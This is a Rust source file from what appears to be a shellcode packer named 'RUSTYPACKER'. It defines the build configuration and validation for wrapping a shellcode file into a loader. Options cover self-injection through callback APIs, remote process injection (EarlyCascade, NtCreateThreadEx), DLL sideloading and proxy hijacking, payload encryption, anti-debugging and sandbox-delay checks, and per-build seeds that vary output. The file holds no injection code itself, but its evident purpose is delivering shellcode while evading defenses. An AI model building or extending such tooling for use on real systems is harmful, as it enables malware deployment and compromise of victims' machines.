use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::path::PathBuf;

use crate::app::state::UiState;

#[derive(Debug, thiserror::Error)]
pub enum BuildSpecError {
    #[error("shellcode path not set")]
    NoShellcode,
    #[error("shellcode file not found: {0}")]
    ShellcodeMissing(PathBuf),
    #[error("delivery path not set")]
    NoDelivery,
    #[error("dll export name is empty")]
    DllExportEmpty,
    #[error("dll export name not a valid identifier: {0}")]
    DllExportInvalid(String),
    #[error("target process exe is empty")]
    TargetExeEmpty,
    #[error("delay ms not a non-negative integer: {0}")]
    DelayMsInvalid(String),
    #[error("gpu shellexec is only supported with the self-inject loader")]
    GpuStorageWrongLoader,
    #[error("sideload target dll not set")]
    SideloadNoTarget,
    #[error("sideload target dll missing: {0}")]
    SideloadTargetMissing(PathBuf),
    #[error("sideload hijack export is empty")]
    SideloadHijackEmpty,
    #[error("sideload proxy mode needs a renamed dll path (or check 'use absolute path')")]
    SideloadProxyNeedsRenamed,
    #[error("sideload only works on self-inject loaders")]
    SideloadWrongLoader,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
pub enum LoaderKindSel {
    #[default]
    SelfInject,
    Remote,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
pub enum RemoteMethod {
    #[default]
    EarlyCascade,
    NtCreateThreadEx,
}

impl RemoteMethod {
    pub fn label(self) -> &'static str {
        match self {
            RemoteMethod::EarlyCascade     => "EarlyCascade (suspended)",
            RemoteMethod::NtCreateThreadEx => "NtCreateThreadEx",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
pub enum SelfInjectMethod {
    #[default]
    Fiber,
    Calendar,
    Desktops,
    WinStations,
    GeoId,
}

impl SelfInjectMethod {
    pub fn label(self) -> &'static str {
        match self {
            SelfInjectMethod::Fiber       => "FIBER SWITCH",
            SelfInjectMethod::Calendar    => "EnumCalendarInfoA",
            SelfInjectMethod::Desktops    => "EnumDesktopsW",
            SelfInjectMethod::WinStations => "EnumWindowStationsW",
            SelfInjectMethod::GeoId       => "EnumSystemGeoID",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
pub enum OutputFormSel {
    #[default]
    Exe,
    Dll,
    DllSideload,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
pub enum SideloadMode {
    #[default]
    Sideload,
    Proxy,
}

impl SideloadMode {
    pub fn label(self) -> &'static str {
        match self {
            SideloadMode::Sideload => "sideload (pure replace)",
            SideloadMode::Proxy    => "proxy (forwards via .def)",
        }
    }
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct SideloadConfig {
    pub target_dll: Option<PathBuf>,
    pub hijack_export: String,
    pub mode: SideloadMode,
    pub renamed: String,
    pub use_absolute_path: bool,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
pub enum EncryptionKind {
    #[default]
    Xor8,
    AesCtr,
    Rc4,
    Khufu,
    Ecies,
    CamelliaToy,
}

impl EncryptionKind {
    pub fn label(self) -> &'static str {
        match self {
            EncryptionKind::Xor8        => "xor8",
            EncryptionKind::AesCtr      => "aes-ctr",
            EncryptionKind::Rc4         => "rc4",
            EncryptionKind::Khufu       => "khufu",
            EncryptionKind::Ecies       => "ecies",
            EncryptionKind::CamelliaToy => "camellia",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum CheckId {
    CheckRemote,
    DebugPort,
    TebFlag,
    VecInt3,
    NtDelay,
}

#[derive(Debug, Clone)]
pub enum LoaderKind {
    SelfInject { method: SelfInjectMethod, format: OutputForm },
    Remote { method: RemoteMethod, target_exe: String },
}

#[derive(Debug, Clone)]
pub enum OutputForm {
    Exe,
    Dll { export: String },
    DllSideload(SideloadSpec),
}

#[derive(Debug, Clone)]
pub struct SideloadSpec {
    pub target_dll: PathBuf,
    pub hijack_export: String,
    pub mode: SideloadMode,
    pub original_name: String,
    pub use_absolute_path: bool,
}

#[derive(Debug, Clone)]
pub struct CheckChoice {
    pub id: CheckId,
    pub params: BTreeMap<String, String>,
}

#[derive(Debug, Clone, Copy)]
pub struct BuildSeed(pub u64);

impl BuildSeed {
    pub fn from_os() -> Self {
        if let Ok(hex) = std::env::var("RUSTYPACKER_SEED") {
            if let Ok(v) = u64::from_str_radix(hex.trim_start_matches("0x"), 16) {
                return Self(v);
            }
        }
        let mut bytes = [0u8; 8];
        getrandom::getrandom(&mut bytes).expect("getrandom");
        Self(u64::from_le_bytes(bytes))
    }

    pub fn hex(self) -> String {
        format!("{:016x}", self.0)
    }
}

#[derive(Debug, Clone)]
pub struct BuildSpec {
    pub shellcode_path: PathBuf,
    pub delivery_path:  PathBuf,
    pub loader:         LoaderKind,
    pub encryption:     EncryptionKind,
    pub checks:         Vec<CheckChoice>,
    pub gpu_storage:    bool,
    pub seed:           BuildSeed,
}

impl UiState {
    pub fn to_spec(&self) -> Result<BuildSpec, BuildSpecError> {
        let shellcode_path = self
            .shellcode_path
            .clone()
            .ok_or(BuildSpecError::NoShellcode)?;
        if !shellcode_path.exists() {
            return Err(BuildSpecError::ShellcodeMissing(shellcode_path));
        }
        let delivery_path = self
            .delivery_path
            .clone()
            .ok_or(BuildSpecError::NoDelivery)?;

        let loader = match self.loader {
            LoaderKindSel::SelfInject => {
                let format = match self.output {
                    OutputFormSel::Exe => OutputForm::Exe,
                    OutputFormSel::Dll => {
                        let export = self.dll_export.trim().to_string();
                        if export.is_empty() {
                            return Err(BuildSpecError::DllExportEmpty);
                        }
                        if !valid_ident(&export) {
                            return Err(BuildSpecError::DllExportInvalid(export));
                        }
                        OutputForm::Dll { export }
                    }
                    OutputFormSel::DllSideload => {
                        let target_dll = self
                            .sideload
                            .target_dll
                            .clone()
                            .ok_or(BuildSpecError::SideloadNoTarget)?;
                        if !target_dll.exists() {
                            return Err(BuildSpecError::SideloadTargetMissing(target_dll));
                        }
                        let hijack_export = self.sideload.hijack_export.trim().to_string();
                        if hijack_export.is_empty() {
                            return Err(BuildSpecError::SideloadHijackEmpty);
                        }
                        let proxy = matches!(self.sideload.mode, SideloadMode::Proxy);
                        if proxy
                            && !self.sideload.use_absolute_path
                            && self.sideload.renamed.trim().is_empty()
                        {
                            return Err(BuildSpecError::SideloadProxyNeedsRenamed);
                        }
                        let original_name = if self.sideload.use_absolute_path {
                            target_dll.display().to_string()
                        } else if !self.sideload.renamed.trim().is_empty() {
                            self.sideload.renamed.trim().to_string()
                        } else {
                            let stem = crate::pe::dll_stem(&target_dll);
                            format!("{stem}_orig.dll")
                        };
                        OutputForm::DllSideload(SideloadSpec {
                            target_dll,
                            hijack_export,
                            mode: self.sideload.mode,
                            original_name,
                            use_absolute_path: self.sideload.use_absolute_path,
                        })
                    }
                };
                LoaderKind::SelfInject { method: self.selfinject_method, format }
            }
            LoaderKindSel::Remote => {
                let target_exe = self.target_exe.trim().to_string();
                if target_exe.is_empty() {
                    return Err(BuildSpecError::TargetExeEmpty);
                }
                LoaderKind::Remote { method: self.remote_method, target_exe }
            }
        };

        let mut checks: Vec<CheckChoice> = Vec::new();
        for (id, on) in &self.checks_on {
            if !on {
                continue;
            }
            let params = collect_params_for(*id, &self.check_params)?;
            checks.push(CheckChoice { id: *id, params });
        }

        if self.gpu_storage && !matches!(self.loader, LoaderKindSel::SelfInject) {
            return Err(BuildSpecError::GpuStorageWrongLoader);
        }
        if matches!(self.output, OutputFormSel::DllSideload)
            && !matches!(self.loader, LoaderKindSel::SelfInject)
        {
            return Err(BuildSpecError::SideloadWrongLoader);
        }

        Ok(BuildSpec {
            shellcode_path,
            delivery_path,
            loader,
            encryption: self.encryption,
            checks,
            gpu_storage: self.gpu_storage,
            seed: BuildSeed::from_os(),
        })
    }
}

fn collect_params_for(
    id: CheckId,
    raw: &BTreeMap<String, String>,
) -> Result<BTreeMap<String, String>, BuildSpecError> {
    let mut out: BTreeMap<String, String> = BTreeMap::new();
    if id == CheckId::NtDelay {
        let raw_ms = raw
            .get("nt_nap.ms")
            .cloned()
            .unwrap_or_else(|| "3000".into());
        let _ = raw_ms
            .trim()
            .parse::<u64>()
            .map_err(|_| BuildSpecError::DelayMsInvalid(raw_ms.clone()))?;
        out.insert("ms".into(), raw_ms.trim().to_string());
        out.insert(
            "placement".into(),
            raw.get("nt_nap.placement")
                .cloned()
                .unwrap_or_else(|| "between".into()),
        );
    }
    Ok(out)
}

fn valid_ident(s: &str) -> bool {
    if s.is_empty() || s.len() > 32 {
        return false;
    }
    let mut chars = s.chars();
    let first = chars.next().unwrap();
    if !(first.is_ascii_alphabetic() || first == '_') {
        return false;
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}
